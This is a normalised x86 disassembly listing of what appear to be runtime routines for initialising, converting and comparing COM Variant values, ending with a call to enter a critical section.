mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_3a65ba0
jmp r-xdata
lea edx [ ebp - 0x54 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_3a73d04
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_3a65ab8
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_3a6986c
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_3a6986c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_3a6986c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x64 ]
call sub_3a69958
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x68 ]
call sub_3a69958
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_3a746a4
jmp r-xdata
sub_3a74bf8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a74c62
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_3a70f80
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_3a66ccc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a74c69
lea eax [ ebp - 0x10 ]
call sub_3a70c58
retn
mov dx 0xd
mov ax 0x101
call sub_3a70420
sub_3a74c70
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_3a74bf8
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_3a66ccc
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_3a66ccc
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_3a66cb4
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
movzx eax [ ebx ]
call sub_3a7618c
test al al
je r-xdata
mov eax esi
call sub_3a66cb4
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_3a70420
jmp r-xdata
movzx eax [ ebx ]
mov dx 0xd
call sub_3a70420
mov eax esi
call sub_3a66cb4
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_3a64434
test al al
jne r-xdata
sub_3a74d3c
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_3a66cb4
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_3a66cb4
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_3a70420
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_3a66ccc
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_3a66ccc
jmp r-xdata
jmp r-xdata
mov edx esp
movzx eax [ ebx ]
call sub_3a7618c
test al al
je r-xdata
movzx eax [ ebx ]
mov dx 0x9
call sub_3a70420
mov eax esi
call sub_3a66cb4
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_3a64434
test al al
jne r-xdata
sub_3a74de8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_3a70bdc
mov [ edi ] 0x3
movsx eax bl
movzx eax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_3a74e24
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_3a70bdc
sub_3a74e44
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_3a70bdc
sub_3a74e64
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_3a70bdc
sub_3a74e84
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_3a70bdc
sub_3a74ea4
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_3a70bdc
sub_3a74ec4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_3a70bdc
sub_3a74ee4
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_3a70bdc
sub_3a74f10
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_3a70bdc
sub_3a74f34
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_3a70bdc
sub_3a74f60
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_3a70bdc
sub_3a74f8c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_3a70bdc
sub_3a74fb8
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_3a70bdc
sub_3a7501c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_3a652f4
pop esi
pop ebx
retn
mov eax ebx
call sub_3a70bdc
sub_3a75048
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_3a65c8c
pop esi
pop ebx
retn
mov eax ebx
call sub_3a70bdc
sub_3a75080
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_3a66ccc
pop esi
pop ebx
retn
mov eax ebx
call sub_3a70bdc
sub_3a750ac
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_3a66ccc
pop esi
pop ebx
retn
mov eax ebx
call sub_3a70bdc
sub_3a750d8
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
jne r-xdata
call sub_3a704bc
mov bx 0x8
jmp r-xdata
sub_3a750fc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a751bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_3a70f80
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_3a759d0
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a751c6
lea eax [ ebp - 0x11 ]
call sub_3a70c58
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a75193
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_3a70f80
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_3a759d0
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_3a70c58
retn
sub_3a751e8
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
movzx edx [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_3a70510
jmp r-xdata
je r-xdata
movzx edx [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
movzx ebx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_3a70510
jmp r-xdata
je r-xdata
movzx edx [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
movzx ebx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_3a70510
jmp r-xdata
je r-xdata
call sub_3a704bc
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
movzx ebx [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
movzx ebx [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
movzx ebx [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_3a752f0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_3a7532c
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fwait
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fwait
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_3a75358
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fwait
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fwait
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_3a75384
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fwait
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fwait
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_3a753b4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_3a7540f
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_3a73f84
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_3a73f84
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a692f8
xor edx edx
call sub_3a752dc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a75416
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
sub_3a75420
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
movzx eax [ esi ]
call sub_3a750d8
movzx eax ax
movzx ebx [ eax + rw-data ]
movzx eax [ edi ]
call sub_3a750d8
movzx eax ax
movzx eax [ eax + rw-data ]
movzx edx al
movzx ecx bl
imul ecx ecx 0xb
add ecx rw-data
movzx edx [ ecx + edx ]
cmp edx 0xa
ja r-xdata
call sub_3a704bc
mov al 0x1
jmp [ edx * 4 + jump_table_3a75471 ]
call sub_3a704bc
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_3a751d4
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_3a751e8
jmp r-xdata
mov eax edi
call sub_3a71610
push eax
mov eax esi
call sub_3a71610
pop edx
call sub_3a752dc
jmp r-xdata
mov eax esi
call sub_3a720e0
push edx
push eax
mov eax edi
call sub_3a720e0
push edx
push eax
call sub_3a752f0
jmp r-xdata
mov eax esi
call sub_3a72bf8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_3a72bf8
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_3a7532c
jmp r-xdata
mov eax esi
call sub_3a73364
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_3a73364
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_3a75358
jmp r-xdata
mov eax esi
call sub_3a738cc
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_3a738cc
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_3a75384
jmp r-xdata
mov edx edi
mov eax esi
call sub_3a753b4
jmp r-xdata
mov eax edi
call sub_3a726d8
and eax 0x7f
push eax
mov eax esi
call sub_3a726d8
and eax 0x7f
pop edx
call sub_3a752dc
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_3a750fc
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3a755ac
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x1
movzx esi [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_3a751d4
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_3a751d4
mov [ ebp - 0x9 ] al
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_3a7618c
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x2
xor eax eax
call sub_3a751e8
mov [ ebp - 0x9 ] al
jmp r-xdata
movzx eax [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
call sub_3a7618c
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov al 0x2
call sub_3a751e8
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_3a704bc
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_3a704bc
jmp r-xdata
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a75747
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_3a7124c
movzx eax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
movzx eax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax esi
call sub_3a7618c
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a758db
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_3a7124c
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp ax [ ebp - 0x28 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a75838
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_3a7124c
movzx eax [ ebp - 0x28 ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_3a75420
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_3a70c58
retn
call sub_3a703cc
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a756b8
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_3a7124c
movzx eax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0xc ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_3a704bc
jmp r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
call sub_3a75420
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_3a70c58
retn
call sub_3a703cc
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_3a70c58
retn
call sub_3a703cc
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_3a70c58
retn
call sub_3a703cc
call sub_3a704bc
movzx eax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a75992
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_3a7124c
movzx eax [ ebp - 0x28 ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_3a70c58
retn
call sub_3a703cc
sub_3a759d0
push esi
push edi
movzx esi [ eax ]
movzx edi [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_3a759d0
jmp r-xdata
call sub_3a75420
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_3a759d0
jmp r-xdata
pop edi
pop esi
retn
call sub_3a755ac
and di 0xfff
cmp di 0x10f
jae r-xdata
call sub_3a75420
jmp r-xdata
sub_3a75bbc
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a75ce2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_3a652f4
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_3a652f4
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a7618c
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_3a652f4
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_3a655b8
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_3a69980
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_3a655b8
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_3a64260
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_3a63078
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_3a65504
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a75ce9
lea eax [ ebp - 0x208 ]
call sub_3a652a0
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_3a655b8
sub_3a75d40
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_3a75d30
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movzx ebx [ esp + 0x4 ]
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_3a7618c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
lea edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
movzx eax [ esp + 0x4 ]
cmp ax 0x9
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor eax eax
jmp r-xdata
sub_3a75db4
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_3a75d30
push esi
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call sub_3a75d30
push esi
mov esi eax
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
movzx eax [ esp ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
sete al
jmp r-xdata
movzx eax [ esp + 0x10 ]
sub ax 0x2
jae r-xdata
cmp [ esp + 0x10 ] 0x1
sete al
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx esi
call sub_3a76338
sete al
xor eax eax
jmp r-xdata
sub_3a75e50
push ebx
movzx ebx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_3a75e50
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_3a75e9c
add esp 0xfffffff8
test dl dl
je r-xdata
movzx eax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_3a75e50
pop ecx
pop edx
retn
sub_3a75ee8
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
